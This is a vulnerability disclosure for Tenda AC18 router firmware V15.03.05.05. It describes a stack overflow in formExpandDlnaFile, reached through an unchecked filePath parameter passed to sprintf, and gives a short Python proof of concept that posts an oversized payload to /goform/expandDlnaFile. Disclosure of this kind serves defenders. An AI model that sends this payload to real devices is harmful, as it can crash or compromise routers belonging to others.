## Overview

- The device's official website: https://www.tenda.com.cn/product/overview/AC18.html

- Firmware download website: https://www.tenda.com.cn/download/detail-2610.html

## Affected version

V15.03.05.05

## Vulnerability details

The Tenda AC18 V15.03.05.05 firmware has a stack overflow vulnerability in the `formExpandDlnaFile` function. The `v18` variable receives the `filePath` parameter from a POST request. The value is directly used in a `sprintf` function and passes to a local variable on the stack, which can override the return address of the function. The user-provided `filePath` can trigger this security vulnerability.

![image-20240305164522670](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305164522670.png)

![image-20240305162856555](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305162856555.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/expandDlnaFile"
payload = b"a"*2000

data = {"filePath": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240305164900093](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305164900093.png)
